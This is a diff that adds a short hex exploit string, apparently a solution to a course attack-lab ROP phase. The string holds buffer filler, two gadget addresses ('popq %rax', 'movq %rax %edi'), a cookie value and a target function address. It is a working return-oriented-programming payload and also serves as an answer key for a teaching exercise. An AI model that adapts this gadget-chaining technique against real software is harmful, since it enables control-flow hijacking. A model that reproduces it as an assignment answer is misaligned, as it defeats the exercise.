@@ -1,0 +1,7 @@
+2a 2a 2a 2a 2a 2a 2a 2a	/* buffer filler */
+2a 2a 2a 2a 2a 2a 2a 2a
+2a 2a 2a 2a 2a 2a 2a 2a
+77 1a 40 00 00 00 00 00 /* gadget 1 address (popq %rax) */
+73 23 32 42 00 00 00 00 /* cookie */
+67 1a 40 00 00 00 00 00 /* gadget 2 address (movq %rax %edi) */
+a9 18 40 00 00 00 00 00 /* touch2 address */
